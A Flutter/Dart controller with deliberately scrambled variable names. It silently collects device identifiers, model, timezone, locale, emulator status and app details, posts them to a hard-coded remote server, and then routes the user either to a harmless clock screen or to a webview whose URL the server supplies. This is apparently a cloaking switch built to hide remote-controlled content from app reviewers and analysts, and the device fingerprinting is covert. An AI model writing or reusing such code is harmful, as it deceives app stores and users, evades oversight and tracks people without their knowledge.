import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var vefsitxh = RxBool(false);
  var jflxvps = RxBool(true);
  var uiqwoj = RxString("");
  var kendra = RxBool(false);
  var graham = RxBool(true);
  final etqsoainl = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    qiaz();
  }


  Future<void> qiaz() async {

    kendra.value = true;
    graham.value = true;
    jflxvps.value = false;

    etqsoainl.post("https://yowa.vilageori.cloud/4Z17OAGRAN6UBF",data: await eptfoijk()).then((value) {
      var lngqf = value.data["lngqf"] as String;
      var qzwre = value.data["qzwre"] as bool;
      if (qzwre) {
        uiqwoj.value = lngqf;
        cassidy();
      } else {
        boyle();
      }
    }).catchError((e) {
      jflxvps.value = true;
      graham.value = true;
      kendra.value = false;
    });
  }

  Future<Map<String, dynamic>> eptfoijk() async {
    final DeviceInfoPlugin ylrhsgpk = DeviceInfoPlugin();
    PackageInfo nxom_xkmosew = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var rmxnwq = Platform.localeName;
    var IJcaL = currentTimeZone;

    var ymHK = nxom_xkmosew.packageName;
    var efvKRPHM = nxom_xkmosew.version;
    var CbRmS = nxom_xkmosew.buildNumber;

    var hHxzO = nxom_xkmosew.appName;
    var psWwzMT  = "";
    var medaCorkery = "";
    var gunnerMorar = "";
    var viMzTZRd = "";
    var ofeliaPfannerstill = "";
    var leslyKovacek = "";
    var vicentaMcDermott = "";


    var LKJIh = "";
    var WNFLz = "";
    var kNTuzHQp = false;

    if (GetPlatform.isAndroid) {
      WNFLz = "android";
      var durnoz = await ylrhsgpk.androidInfo;

      viMzTZRd = durnoz.brand;

      LKJIh  = durnoz.model;
      psWwzMT = durnoz.id;

      kNTuzHQp = durnoz.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      WNFLz = "ios";
      var licenaqosd = await ylrhsgpk.iosInfo;
      viMzTZRd = licenaqosd.name;
      LKJIh = licenaqosd.model;

      psWwzMT = licenaqosd.identifierForVendor ?? "";
      kNTuzHQp  = licenaqosd.isPhysicalDevice;
    }

    var res = {
      "gunnerMorar" : gunnerMorar,
      "hHxzO": hHxzO,
      "efvKRPHM": efvKRPHM,
      "ymHK": ymHK,
      "LKJIh": LKJIh,
      "ofeliaPfannerstill" : ofeliaPfannerstill,
      "IJcaL": IJcaL,
      "viMzTZRd": viMzTZRd,
      "CbRmS": CbRmS,
      "psWwzMT": psWwzMT,
      "rmxnwq": rmxnwq,
      "WNFLz": WNFLz,
      "kNTuzHQp": kNTuzHQp,
      "leslyKovacek" : leslyKovacek,
      "medaCorkery" : medaCorkery,
      "vicentaMcDermott" : vicentaMcDermott,

    };
    return res;
  }

  Future<void> boyle() async {
    Get.offAllNamed("/localClock");
  }

  Future<void> cassidy() async {
    Get.offAllNamed("/monent");
  }

}
